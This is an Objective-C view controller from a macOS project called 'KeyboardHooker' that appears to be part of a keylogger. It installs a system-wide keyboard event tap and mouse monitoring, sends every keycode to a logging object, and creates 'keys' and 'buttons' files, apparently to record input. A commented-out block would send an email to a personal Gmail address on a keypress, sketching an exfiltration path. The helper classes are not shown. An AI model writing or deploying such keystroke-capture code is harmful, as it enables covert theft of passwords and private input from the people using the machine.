//
//  ViewController.m
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "ViewController.h"
#import <SystemConfiguration/SystemConfiguration.h>

@implementation ViewController

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    //if ((int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode) == 63) return nil;
    
    /*
    if ((int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode) == 1) {
        [EmailSender sendEmailWithMail:@"i.suprynovic@gmail.com" withSubject:@"Hello" Attachments:nil];
    }
    */
    
    [[(__bridge ViewController*)refcon key] doFullCycle:(int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)];
    return event;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [FileManager createFile:@"keys"];
    [FileManager createFile:@"buttons"];
    
    _key = [[KeyHooker alloc] init];
    _mouse = [[MouseHooker alloc] init];
    
    [KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void *)(self)];
    [_mouse setMouseNotifications];
}

@end
